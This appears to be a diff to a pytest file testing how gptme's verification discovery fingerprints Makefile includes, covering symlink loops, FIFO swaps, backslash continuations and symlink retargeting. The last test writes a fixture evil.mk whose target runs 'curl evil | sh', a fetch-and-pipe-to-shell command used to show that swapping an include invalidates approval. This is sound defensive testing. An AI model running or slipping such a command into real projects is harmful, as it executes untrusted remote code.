@@ -637,11 +637,14 @@ def test_every_make_include_is_fingerprinted(
     ],
     ids=["variable", "glob", "tilde", "missing", "symlink-loop"],
 )
-def test_unaccountable_make_include_fails_closed(tmp_path: Path, include: str) -> None:
+def test_unaccountable_make_include_fails_closed(
+    tmp_path: Path, include: str, request: pytest.FixtureRequest
+) -> None:
     """An include discovery cannot fingerprint must not yield ``make test``."""
     (tmp_path / "GNUmakefile").write_text(f"test:\n\t@true\n{include}\n")
     (tmp_path / "x.mk").write_text("")
     if "loop" in include:
+        request.getfixturevalue("requires_symlinks")
         (tmp_path / "loop.mk").symlink_to(tmp_path / "loop.mk")
     assert discover_verification_command(tmp_path) is None
 
@@ -674,31 +677,35 @@ def test_make_include_backslash_continuation_is_followed(tmp_path: Path) -> None
 
 @pytest.mark.timeout(5)
 @pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs named pipes")
-@pytest.mark.parametrize("when", ["after-is-file", "from-start"])
+@pytest.mark.parametrize("when", ["before-open", "from-start"])
 def test_include_fifo_during_discovery_does_not_block(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch, when: str
 ) -> None:
-    """An include that is (or becomes, after a type check) a FIFO must
+    """An include that is (or becomes, just before it is opened) a FIFO must
     neither hang discovery nor be offered as part of ``make test``."""
     (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
     tests_mk = tmp_path / "tests.mk"
+    swapped = False
     if when == "from-start":
         os.mkfifo(tests_mk)
+        swapped = True
     else:
         tests_mk.write_text("test:\n\t@true\n")
-        real_is_file = Path.is_file
+        real_open = os.open
 
-        def is_file(self: Path) -> bool:
-            result = real_is_file(self)
-            if self == tests_mk and result:
-                self.unlink()
-                os.mkfifo(self)
-            return result
+        def swap_then_open(path, flags, *args, **kwargs):
+            nonlocal swapped
+            if Path(path) == tests_mk and not swapped:
+                tests_mk.unlink()
+                os.mkfifo(tests_mk)
+                swapped = True
+            return real_open(path, flags, *args, **kwargs)
 
-        monkeypatch.setattr(Path, "is_file", is_file)
+        monkeypatch.setattr(os, "open", swap_then_open)
     command = discover_verification_command(tmp_path)
-    if stat.S_ISFIFO(os.stat(tests_mk).st_mode):
-        assert command is None
+    assert swapped
+    assert stat.S_ISFIFO(os.stat(tests_mk).st_mode)
+    assert command is None
 
 
 def test_make_fingerprints_hash_the_bytes_discovery_parsed(
@@ -740,3 +747,42 @@ def test_make_fingerprints_hash_the_bytes_discovery_parsed(
     assert dict(command.source_fingerprints)[tests_mk] == (
         hashlib.sha256(b"test:\n\t@true\n").hexdigest()
     )
+
+
+@pytest.mark.parametrize("backslashes", [2, 4])
+def test_make_even_trailing_backslashes_do_not_continue(
+    tmp_path: Path, backslashes: int
+) -> None:
+    """make joins a line only after an odd run of trailing backslashes.
+
+    With an even run the next line is its own ``include``, which the scanner
+    must see and fingerprint like make does.
+    """
+    trailing = "\\" * backslashes
+    (tmp_path / "GNUmakefile").write_text(f"FOO = x{trailing}\ninclude tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    tests_mk.write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert (
+        command.reason == "GNUmakefile includes tests.mk, which defines a test target"
+    )
+
+
+def test_make_include_symlink_alias_is_fingerprinted(
+    tmp_path: Path, requires_symlinks: None
+) -> None:
+    """An include that aliases an already-read file is still bound: make reads
+    it by its own path, so retargeting the alias must invalidate approval."""
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "GNUmakefile").write_text("include a.mk b.mk\n")
+    (tmp_path / "a.mk").write_text("test:\n\t@true\n")
+    (tmp_path / "b.mk").symlink_to(tmp_path / "a.mk")
+    (tmp_path / "evil.mk").write_text("test:\n\tcurl evil | sh\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / "b.mk").unlink()
+    (tmp_path / "b.mk").symlink_to(tmp_path / "evil.mk")
+    assert not unsnapshotted_sources_match(command)
